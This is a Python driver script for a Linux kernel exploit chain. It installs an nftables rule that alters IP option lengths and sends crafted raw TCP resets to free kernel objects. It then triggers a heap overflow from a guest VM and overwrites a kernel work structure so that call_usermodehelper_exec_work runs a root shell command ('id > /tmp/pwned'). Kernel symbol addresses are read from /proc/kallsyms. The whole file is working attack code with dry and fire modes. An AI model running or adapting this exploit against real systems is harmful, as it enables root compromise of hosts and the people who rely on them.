#!/usr/bin/env python3
# r7_final4.py <Osp> <Oseq> <Xsp> <Xseq> <gw> <ovsp> <ovseq> <dry|fire>
# Two-slot chain, nft-payload-SET variant (xt_CHECKSUM replaced end-to-end).
# The nft table ip m2 / chain c (type filter hook input priority mangle) must
# exist; this driver adds the SPORT-CONDITIONED rule
#     tcp dport 7778 tcp sport <ovsp> @nh,168,8 set 0x40|0xE0
# BEFORE the chain (so no mid-sequence delay), and deletes it after.
# Sequence: nft-add -> RST O -> RST X -> host UDP probe (work at X, head=O) ->
# GON to the guest waiter (IHL=6 overflower via virtio; nft sets RR length) ->
# overflower dopt (36 B, kmalloc-64) pops O; echo copies 64/224 B from IP+20
# into O+32..; payload[8..] lands on X+0.. (work header / subprocess_info).
# Env: R7_X (absolute X), R7_PWQ, R7_PH.
import socket, struct, sys, os, time, subprocess

SRC4 = bytes([192, 168, 250, 114]); DST4 = bytes([192, 168, 250, 1])
GUEST = "192.168.250.114"
NFT_T = "ip"; NFT_C = "m2/c"

def csum(d):
    if len(d) % 2: d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d)//2), d))
    while s >> 16: s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def tcp_frame(sport, seq, flags=0x02):
    hl = 20; th = 20
    ip = bytearray(hl + th)
    ip[0] = 0x45
    struct.pack_into(">H", ip, 2, len(ip)); struct.pack_into(">H", ip, 4, 0x5757)
    ip[8] = 64; ip[9] = 6; ip[12:16] = SRC4; ip[16:20] = DST4
    t = memoryview(ip)[hl:]
    struct.pack_into(">HHII", t, 0, sport, 7778, seq & 0xffffffff, 0)
    t[12] = 0x50; t[13] = flags
    struct.pack_into(">H", t, 14, 0x4000 if flags & 0x02 else 0)
    pseudo = SRC4 + DST4 + b"\0" + bytes([6]) + struct.pack(">H", th)
    struct.pack_into(">H", t, 16, csum(pseudo + bytes(t[:th])))
    struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    return bytes(ip)

def ksym(n):
    for l in open("/proc/kallsyms"):
        p = l.split()
        if len(p) >= 3 and p[2] == n: return int(p[0], 16)
    return 0

def work_payload(X, pwq, ph, func, cmd):
    p = bytearray(192)
    struct.pack_into("<Q", p, 0, pwq | 5)
    struct.pack_into("<Q", p, 8, ph); struct.pack_into("<Q", p, 16, ph)
    struct.pack_into("<Q", p, 24, func)
    struct.pack_into("<Q", p, 40, X + 128); struct.pack_into("<Q", p, 48, X + 160)
    struct.pack_into("<Q", p, 56, X + 184); struct.pack_into("<I", p, 64, 2)
    p[128:136] = b"/bin/sh\0"; p[136:140] = b"-c\0\0"
    p[140:140 + len(cmd)] = cmd
    struct.pack_into("<4Q", p, 160, X + 128, X + 136, X + 140, 0)
    return bytes(p)

def nft(*args):
    return subprocess.run(["nft", *args], capture_output=True, text=True)

def main():
    osp = int(sys.argv[1]); oseq = int(sys.argv[2], 0)
    xsp = int(sys.argv[3]); xseq = int(sys.argv[4], 0)
    gw = int(sys.argv[5], 0); ovsp = int(sys.argv[6]); ovseq = int(sys.argv[7], 0)
    mode = sys.argv[8]
    X = int(os.environ["R7_X"], 0); pwq = int(os.environ["R7_PWQ"], 0)
    ph = int(os.environ["R7_PH"], 0)
    setval = "0x40" if mode == "dry" else "0xE0"
    func = ksym("__x86_return_thunk") if mode == "dry" else ksym("call_usermodehelper_exec_work")
    cmd = b"touch /tmp/r7dry\0" if mode == "dry" else b"id > /tmp/pwned\0"
    payload = work_payload(X, pwq, ph, func, cmd)
    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    u6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); u6.bind(("fd00:1::1", 0))
    go = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); go.connect((GUEST, 9999)); go.settimeout(0.6)
    t0 = time.time()
    # 0) nft rule (sport-conditioned so ONLY the overflower's RR length is set)
    # NB: table and chain must be SEPARATE tokens ("ip m2 c"); "ip m2/c" is a parse error.
    r = nft("add", "rule", "ip", "m2", "c", "tcp", "dport", "7778", "tcp", "sport",
            str(ovsp), "@nh,168,8", "set", setval)
    if r.returncode != 0:
        print("NFTADD-FAIL %s %s" % (r.stdout.strip()[:120], r.stderr.strip()[:200]))
        return 3
    # 1) RST O -> free O, then RST X -> free X (head)
    raw.sendto(tcp_frame(osp, oseq + 1, flags=0x04), ("192.168.250.1", 0))
    raw.sendto(tcp_frame(xsp, xseq + 1, flags=0x04), ("192.168.250.1", 0))
    # 2) host UDP probe -> work pops X, head=O
    try:
        u6.sendto(b"R7W", ("fd01:0:%x::1" % gw, 9))
    except OSError as e:
        print("UDPFAIL", e)
    # 3) GO: guest sends the IHL=6 overflower; nft sets its RR length at INPUT
    msg = ("GON %d %d %s" % (ovsp, ovseq, payload.hex())).encode()
    t1 = time.time()
    go.send(msg)
    try:
        rep = go.recv(64).decode()
    except Exception as e:
        rep = "NOREPLY %s" % e
    t2 = time.time()
    # dedicated chain: flush removes exactly our sport-conditioned rule
    nft("flush", "chain", "ip", "m2", "c")
    print("FIN4 mode=%s X=%#x func=%#x set=%s rsts=%.0fus go=%.0fus total=%.0fus reply=%s" %
          (mode, X, func, setval, (t1 - t0) * 1e6, (t2 - t1) * 1e6, (t2 - t0) * 1e6, rep))

main()
